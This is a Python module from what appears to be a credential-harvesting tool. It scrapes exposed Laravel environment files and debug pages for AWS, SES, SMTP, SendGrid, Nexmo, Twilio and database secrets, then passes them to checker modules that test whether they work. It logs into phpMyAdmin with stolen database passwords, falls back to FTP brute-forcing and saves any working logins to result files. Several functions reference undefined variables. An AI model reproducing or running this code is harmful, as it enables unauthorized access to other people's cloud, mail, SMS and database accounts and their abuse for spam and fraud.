import re,socket,requests
from checker.aws_check import main as aws
from checker.smtp_check import sendtest as smtp
from checker.nexmo_check import main as nexmo
from checker.twilio_check import check_twilio_balance as twilio
from checker.sendgrid_check import main as sendgrid
from brute.ftp import bruteLogin
from tool import c_cp
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'}


def get_aws(text):
    try:
        if "AWS_ACCESS_KEY_ID" in text:
            aws_key = re.findall("\nAWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
            aws_sec = re.findall("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
            aws_reg = re.findall("\nAWS_DEFAULT_REGION=(.*?)\n", text)[0]
            if aws_key == '' or aws_sec == '' or aws_key == 'null' or aws_sec == 'null':
                pass
            else:
                aws(aws_key,aws_sec,aws_reg)
        elif "<td>AWS_ACCESS_KEY_ID</td>" in text:
            aws_key = re.findall("<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
            aws_sec = re.findall("<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
            aws_reg = re.findall("<td>AWS_DEFAULT_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
            if aws_key == '' or aws_sec == '' or aws_key == 'null' or aws_sec == 'null':
                pass
            else:
                aws(aws_key,aws_sec,aws_reg)
        elif "AWS_KEY" in text:
            aws_key = re.findall("\nAWS_KEY=(.*?)\n", text)[0]
            aws_sec = re.findall("\nAWS_SECRET=(.*?)\n", text)[0]
            aws_reg = re.findall("\nAWS_REGION=(.*?)\n", text)[0]
            if aws_key == '' or aws_sec == '' or aws_key == 'null' or aws_sec == 'null':
                pass
            else:
                aws(aws_key,aws_sec,aws_reg)
        elif "SES_KEY" in text:
            aws_key = re.findall("\nSES_KEY=(.*?)\n", text)[0]
            aws_sec = re.findall("\nSES_SECRET=(.*?)\n", text)[0]
            aws_reg = re.findall("\nSES_REGION=(.*?)\n", text)[0]
            if aws_key == '' or aws_sec == '' or aws_key == 'null' or aws_sec == 'null':
                pass
            else:
                aws(aws_key,aws_sec,aws_reg)
    except Exception:
        pass

def get_smtp(url,text):
    try:
        if "MAIL_HOST=" in text:
            mailhost = re.findall("\nMAIL_HOST=(.*?)\n", text)[0]
            mailuser = re.findall("\nMAIL_USERNAME=(.*?)\n", text)[0]
            mailpass = re.findall("\nMAIL_PASSWORD=(.*?)\n", text)[0]
            if mailuser == '' or mailpass == '' or mailuser == 'null' or mailpass == 'null' or mailuser == '""' or mailpass == '""':
                pass
            else:
                smtp(url=url,host=mailhost,port='587',user=mailuser,passw=mailpass,sender=mailuser)
                c_cp.redirected_url(i=url, username=mailuser, password=mailpass)
        if "MAIL_PASSWORD=apikey" in text:
            mailpass = re.findall("\nMAIL_PASSWORD=(.*?)\n", text)[0]
            if mailuser == '' or mailpass == '' or mailuser == 'null' or mailpass == 'null' or mailuser == '""' or mailpass == '""':
                pass
            else:
                sendgrid(mailpass)
        elif "<td>MAIL_HOST</td>" in text:
            mailhost = re.findall('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
            mailuser = re.findall('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
            mailpass = re.findall('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
            if mailuser == '' or mailpass == '' or mailuser == 'null' or mailpass == 'null' or mailuser == '""' or mailpass == '""':
                pass
            else:
                smtp(url=url,host=mailhost,port='587',user=mailuser,passw=mailpass,sender=mailuser)
                c_cp.redirected_url(i=url, username=mailuser, password=mailpass)
        elif 'public $smtpuser =' in text:
            user = re.findall("smtpuser = '(.*)';", ReadSMtpCnf)[0]
            pw = re.findall("smtppass = '(.*)';", ReadSMtpCnf)[0]
            host = re.findall("smtphost = '(.*)';", ReadSMtpCnf)[0]
            port = re.findall("smtpport = '(.*)';", ReadSMtpCnf)[0]
            secure = re.findall("smtpsecure = '(.*)';", ReadSMtpCnf)[0]
            if user == '' or user == 'localhost':
                pass
            else:
                smtp(url=url,host=host,port=port,user=user,passw=pw,sender=user)
                c_cp.redirected_url(i=url, username=mailuser, password=mailpass)
    except Exception:
        pass

def get_nexmo(text):
    try:
        if 'NEXMO' in text:
            nexmokey = re.findall("\nNEXMO_KEY=(.*?)\n", text)[0]
            nexmoapi = re.findall("\nNEXMO_SECRET=(.*?)\n", text)[0]
            try:
                nexmofrom = re.findall("\nNEXMO_FROM=(.*?)\n", text)[0]
            except:
                nexmofrom = ''
            try:
                nexmofrom2 = re.findall("\nSMS_FROM=(.*?)\n", text)[0]
            except:
                nexmofrom2 = ''
            if nexmokey == '' or nexmoapi == '' or nexmokey == 'null' or nexmoapi == 'null' or nexmokey == '""' or nexmoapi == '""' or nexmokey == "NEXMO_KEY" or nexmoapi == "NEXMO_SECRET":
                pass
            else:
                nexmo(key=nexmokey,sec=nexmoapi,dari=[nexmofrom,nexmofrom2])
        elif "<td>NEXMO_KEY</td>" in text:
            nexmokey = re.findall('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
            nexmoapi = re.findall('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
            try:
                nexmofrom = re.findall("\nNEXMO_FROM=(.*?)\n", text)[0]
            except:
                nexmofrom = ''
            try:
                nexmofrom2 = re.findall("\nSMS_FROM=(.*?)\n", text)[0]
            except:
                nexmofrom2 = ''
            if nexmokey == '' or nexmoapi == '' or nexmokey == 'null' or nexmoapi == 'null' or nexmokey == '""' or nexmoapi == '""' or nexmokey == "NEXMO_KEY" or nexmoapi == "NEXMO_SECRET":
                pass
            else:
                nexmo(key=nexmokey,sec=nexmoapi,dari=[nexmofrom,nexmofrom2])
    except Exception:
        pass

def get_twillio(text):
    try:
        if "TWILIO" in text:
            acc_sid = re.findall('<td>TWILIO_API_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
            acc_token = re.findall('<td>TWILIO_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
            if acc_sid == '' or acc_token == '' or acc_sid == 'null' or acc_token == 'null' or acc_sid == '""' or acc_token == '""':
                pass
            else:
                twilio(account_sid=acc_sid,auth_token=acc_token)
        elif "TWILIO" in text:
            acc_key = re.findall("\nTWILIO_SID=(.*?)\n", text)[0]
            acc_sec = re.findall("\nTWILIO_TOKEN=(.*?)\n", text)[0]
            if acc_sid == '' or acc_token == '' or acc_sid == 'null' or acc_token == 'null' or acc_sid == '""' or acc_token == '""':
                pass
            else:
                twilio(account_sid=acc_key,auth_token=acc_sec)
        else:
            pass
    except:
        pass

def loginphp(url,host,port,database,username,password):
    head = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': f'http://{url}',
        'Connection': 'keep-alive',
        'Referer': f'http://{url}/phpmyadmin/index.php',
        'Upgrade-Insecure-Requests': '1',
    }
    data = {
        'pma_username': username,
        'pma_password': password,
        'server': '1',
        'lang': 'en-utf-8',
        'convcharset': 'iso-8859-1',
    }
    try:
        log = requests.post("http://"+url+"/phpmyadmin/index.php",headers=head ,data=data)
        if log.status_code == 200:
            print('\033[32;1m\033[0m Access_Data_Base : \033[32;1m'+url+'\033[0m')
            with open("result/acces_database.txt","a") as mn:
                mn.write(f"\n\n{url}/phpmyadmin/index.php\n{'='*30}\n\nhost: {host}\nport: {port}\ndatabase: {database}\nusername: {username}\npassword: {password}")
    except:
        try:
            Ip = socket.gethostbyname(url)
            bruteLogin(Site=url,Target=Ip,Username=username,Password=password)
        except:
            pass
    
def get_mysql(url, text):
    try:
        if 'DB_HOST' in text:
            host = re.findall('\nDB_HOST=(.*?)\n', text)[0]
            port = re.findall('\nDB_PORT=(.*?)\n', text)[0]
            db = re.findall('\nDB_DATABASE=(.*?)\n', text)[0]
            user = re.findall('\nDB_USERNAME=(.*?)\n', text)[0]
            pwd = re.findall('\nDB_PASSWORD=(.*?)\n', text)[0]
            if "localhost" in host or "127.0.0.1" in host:
                c_cp.redirected_url(i=url, username=user, password=pwd)
                loginphp(url=url,host=host,port=port,database=db,username=user,password=pwd)
            else:
                with open("result/database.txt","a") as mek:
                    mek.write(f"\n\n{url}\n{'='*30}\n\nhost: {host}\nport: {port}\ndatabase: {database}\nusername: {username}\npassword: {password}")
        else:
            pass
    except Exception as e:
        pass